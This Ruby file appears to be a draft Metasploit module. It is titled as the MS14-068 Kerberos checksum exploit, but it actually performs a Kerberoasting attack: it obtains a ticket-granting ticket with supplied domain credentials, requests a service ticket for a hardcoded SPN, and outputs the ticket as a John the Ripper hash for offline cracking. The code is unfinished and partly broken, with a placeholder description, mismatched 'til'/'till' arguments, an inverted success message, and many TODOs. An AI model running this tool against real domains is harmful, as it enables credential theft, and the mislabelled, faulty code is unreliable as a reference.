##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'time'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',
        'Description' => %q{
          testing
        },
        'Author' => [
          'Alberto Solino', # impacket example
          'Jacob Robles',   # Python Metasploit module conversion
          'alanfoster'      # Ruby Metasploit module
        ],
        'References' => [
          ['CVE', '2014-6324'],
          ['MSB', 'MS14-068'],
          ['OSVDB', '114751'],
          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],
          ['URL', 'https://github.com/bidord/pykek'],
          ['URL', 'https://www.rapid7.com/blog/post/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2014-11-18'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The Domain User' ]),
        OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        # OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
      ]
    )
  end

  # Sends the required kerberos AS requests for a kerberos Ticket Granting Ticket
  #
  # @param opts [Hash]
  # @return [Rex::Proto::Kerberos::Model::KdcResponse]
  # @see Msf::Kerberos::Client::TgsRequest#build_tgs_request
  # @see Rex::Proto::Kerberos::Model::KdcResponse
  def get_kerberos_tgt(options = {})
    realm = options[:realm]
    server_name = options[:server_name]
    client_name = options[:client_name]
    password = options[:password]
    request_pac = options.fetch(:request_pac, true)

    # TODO: Properly negotiate encryption with the server with graceful fallbacks etc
    desired_encryption_type = Rex::Proto::Kerberos::Crypto::RC4_HMAC

    unicode_password = Rex::Text.to_unicode(password)
    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)

    # First stage: Initial AS-REQ request, used to exchange supported encryption methods.
    # The server may respond with a ticket granting ticket (TGT) immediately,
    # or the client may require preauthentication, and a second AS-REQ is required

    print_status("#{peer} - Sending First AS-REQ...")
    now = Time.now.utc
    expiry_time = now + 1.day
    initial_as_req = build_as_request(
      pa_data: [
        build_pa_pac_request(pac_request_value: request_pac)
      ],
      body: build_as_request_body(
        client_name: client_name,
        server_name: server_name,
        realm: realm,

        etype: [desired_encryption_type],

        # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
        from: nil,
        til: expiry_time,
        rtime: expiry_time
      )
    )

    initial_as_res = send_request_as(req: initial_as_req)

    # Verify the server supports the required encryption
    encryption_type_unsupported = (
      initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR &&
        initial_as_res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_ETYPE_NOSUPP
    )
    if encryption_type_unsupported
      raise Rex::Proto::Kerberos::Model::Error::KerberosEncryptionNotSupported
    end

    is_preauth_required = (
      initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR &&
        initial_as_res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
    )

    # Determine if preauthentication is required, or if the server has responded with a ticket granting ticket
    if !is_preauth_required
      print_status("#{peer} - Preauthentication not required...")
      print_good("TODO: Log ticket for later offline cracking")
      # print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
      initial_as_res.ticket
      as_rep_result = initial_as_res
    else
      vprint_status("#{peer} - Preauthentication required...")
      preauth_as_req = build_as_request(
        pa_data: [
          build_as_pa_time_stamp(key: password_digest, etype: desired_encryption_type),
          build_pa_pac_request(pac_request_value: request_pac)
        ],
        body: build_as_request_body(
          client_name: client_name,
          server_name: server_name,
          realm: realm,
          key: password_digest,

          etype: [desired_encryption_type],

          # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
          from: nil,
          till: expiry_time,
          rtime: expiry_time
        )
      )

      preauth_as_res = send_request_as(req: preauth_as_req)
      as_rep_result = preauth_as_res
    end

    if as_rep_result.msg_type != Rex::Proto::Kerberos::Model::AS_REP
      vprint_status("Kerberos ticket granting ticket created successfully")
      raise "todo"
    end

    {
      ticket: as_rep_result.ticket,
      auth: extract_enc_kdc_response(as_rep_result, password_digest),
    }
  end

  # TODO: Test this with https://www.ibm.com/docs/en/elm/6.0?topic=encryption-enforcing-algorithms-domain-clients
  def format_tgs_rep_to_john(service_user, service_spn, res)
    service_spn = service_spn.gsub(':', '~')

    case res.ticket.enc_part.etype
    when Rex::Proto::Kerberos::Crypto::RC4_HMAC, Rex::Proto::Kerberos::Crypto::DES_CBC_MD5
      "$krb5tgs$#{res.ticket.enc_part.etype}$*#{service_user}$#{res.ticket.realm}$#{service_spn}*$#{res.ticket.enc_part.cipher[0...16].unpack1('H*')}$#{res.ticket.enc_part.cipher[16..].unpack1('H*')}"
    # when Rex::Proto::Kerberos::Crypto::AES128_CTS_HMAC_SHA1_96,
    #     Rex::Proto::Kerberos::Crypto::AES256_CTS_HMAC_SHA1_96
    # TODO: Implement
    #   "$krb5tgs$#{res.ticket.enc_part.etype}$*#{service_user}$#{res.ticket.realm}$#{service_spn}*$#{res.ticket.enc_part.cipher[0...16].unpack1('H*')}$#{res.ticket.enc_part.cipher[16..].unpack1('H*')}"
    else
      print_warning "Unsupported ticket type #{res.ticket.enc_part.etype}"
      nil
    end
  end

  def run
    print_status('Validating options...')

    domain = datastore['DOMAIN'].upcase
    print_status("Using domain #{domain}...")

    server_name = "krbtgt/#{domain}"
    client_name = datastore['USERNAME'].to_s

    # TODO: Decide if this should be asrep or just tgt, or something else
    tgt_result = get_kerberos_tgt(
      server_name: server_name,
      client_name: client_name,
      password: datastore['PASSWORD'],
      realm: domain,
    )

    now = Time.now.utc
    expiry_time = now + 1.day

    # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
    options =  0x40810010

    service_user = 'fake_mysql'
    service_spn =  'ADF3.LOCAL\fake_mysql' # ldap response: "fake_msql/dc3.adf3.local"

    tgs_res = send_request_tgs(
      req: build_tgs_request({
        session_key: tgt_result[:auth].key,
        subkey: nil,
        checksum: nil,
        ticket: tgt_result[:ticket],
        realm: domain,
        client_name: client_name,
        options: options,

        body: build_tgs_request_body(
          cname: nil,
          sname: build_server_name(
            server_name: service_spn,
            server_type: Rex::Proto::Kerberos::Model::NT_MS_PRINCIPAL
          ),
          realm: domain,
          options: options,

          # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
          from: nil,
          till: expiry_time,
          rtime: expiry_time,

          # certificate time
          ctime: now,
        )
      })
    )

    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{tgs_res.error_code}")
    else
      puts format_tgs_rep_to_john(service_user, service_spn, tgs_res)
    end

    return

    # TODO:
    # print_good("#{peer} - Valid TGS-Response, extracting credentials...")
    # cache = extract_kerb_creds(res, sub_key.value)
    # path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
    # print_good("#{peer} - MIT Credential Cache saved on #{path}")
  end
end
